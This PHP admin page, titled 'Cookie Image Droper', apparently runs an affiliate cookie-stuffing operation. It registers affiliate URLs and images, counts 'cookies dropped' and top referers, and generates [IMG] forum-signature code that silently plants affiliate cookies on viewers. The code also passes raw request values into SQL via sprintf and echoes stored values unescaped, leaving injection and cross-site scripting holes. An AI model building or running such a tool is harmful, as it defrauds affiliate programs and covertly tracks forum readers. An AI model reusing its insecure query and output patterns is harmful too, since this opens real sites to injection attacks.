<?php 
include "config.php";

if($_REQUEST['add']) {
	$sql = sprintf("INSERT INTO cookies (name,alias,url,referer,img) VALUES ('%s','%s','%s','%s','%s')",
					$_REQUEST['name'],
					$_REQUEST['alias'],
					$_REQUEST['url'],
					$_REQUEST['referer'],
					$_REQUEST['img']
					);
	$query = mysql_query($sql);
	echo "<div class='hightlight'>New Cookie added</div>";
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" 
  "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<head>
	<title>Cookie Image Droper</title>
	<link rel="stylesheet" type="text/css" media="screen" href="style.css" />
</head>
<body>
	<div id="page">
		<h2>Dropping Statistic:</h2>
		<table cellspacing="0" cellpadding="0" width="100%">
			<tr>
				<th align="left">Name</th>
				<th align="left">Alias</th>
				<th align="left">Host</th>
				<th align="left">Cookies droped</th>
			</tr>
		<?php
		$sql = "SELECT * FROM cookies";
		$query = mysql_query($sql);
		while($row = mysql_fetch_assoc($query)) 
		{	
			$sql2 = sprintf("SELECT * FROM stats a LEFT JOIN cookies b ON(a.c_id = b.id) WHERE a.c_id = %s", $row['id']);
			$query2 = mysql_query($sql2);
			$thissum = mysql_num_rows($query2);
			$sum = $sum + $thissum;
			echo "<tr>
					<td>" . $row['name']. "</td>
					<td>" . $row['alias']. "</td>
					<td>" .parse_url($row['url'],PHP_URL_HOST) . "</td>
					<td>" . $thissum . "</td>";
			echo "</tr>";	
		}
		?>
		<tr>
			<td colspan="3" style='border-top:1px solid #000'><strong>Sum</strong></td>
			<td style='border-top:1px solid #000'><strong><?php echo $sum; ?></strong></td>
		</tr>
		</table>
		
		<h2>Top Referers:</h2>
		<?php
			$sql = "SELECT * FROM stats";
			$query = mysql_query($sql);
			$topreferers = array();
			while($row = mysql_fetch_assoc($query)) 
			{
				$host = str_replace('www.','', parse_url($row['referer'],PHP_URL_HOST));
				$host = ($host == '')?'<b>No Referer</b>':$host;
				if(array_key_exists($host, $topreferers)) {
					$topreferers[$host]['counter']++;
				}
				else {
					$topreferers[$host]['counter'] = 1;
				}
				
			}
			arsort($topreferers);
			?>
			<table cellspacing="0" cellpadding="0" width="100%">
			<tr>
				<th align="left">Host</th>
				<th align="left">Count</th>
			</tr>
			<?php
				foreach($topreferers as $key => $item) {
				echo "<tr>
						<td><a href='http://" . $key . "' target='_blank'>" . $key . "</a></td>
						<td>" . $item['counter'] . "</td>
					</tr>";				
				}
			?>
			</table>
				
		
		<h2>Codes:</h2>
		
		<table cellspacing="0" cellpadding="0" width="100%">
			<tr>
				<th align="left">Name</th>
				<th align="left">Alias</th>
				<th align="left">Host</th>
				<th align="left">Referer</th>
				<th align="left">image</th>
			</tr>
			<?php
				$sql = "SELECT * FROM cookies";
				$query = mysql_query($sql);
				while($row = mysql_fetch_assoc($query)) 
				{
					echo "<tr>
							<td>" . $row['name'] . "</td>
							<td>" . $row['alias'] . "</td>
							<td>" . parse_url($row['url'],PHP_URL_HOST) . "</td>
							<td>" . $row['referer'] . "</td>
							<td><img src='images/" . $row['img'] . "' /></td>
						</tr>
						<tr>						
							<td colspan='5' style='border-bottom:1px solid #000'><input type='text' style='width:100%;padding:3px;' value='[IMG]http://" . $_SERVER['HTTP_HOST'] . "/imgs/signature_" . $row['alias'] . ".jpg[/IMG]' /></td>
						</tr>
					";			
				}
			?>
		</table>
		
		<h2>Add new Cookie:</h2>
		
		<form action="admin.php" method="post">
			<label>Name:</label><input type="text" name="name" /><br />
			<label>Alias:</label><input type="text" name="alias" /><br />
			<label>Affiliet URL:</label><input type="text" name="url" /><br />
			<label>Referer:</label><input type="text" name="referer" /><br />
			<label>Image:</label><input type="text" name="img" /><br />
			Have to be in /imgs/images/ ex.: poker.gif
			<p><input type="submit" name="add" value="Add new Cookie" /></p>
		</form>
		<br /><br /><br />
	</div>
</body>
</html>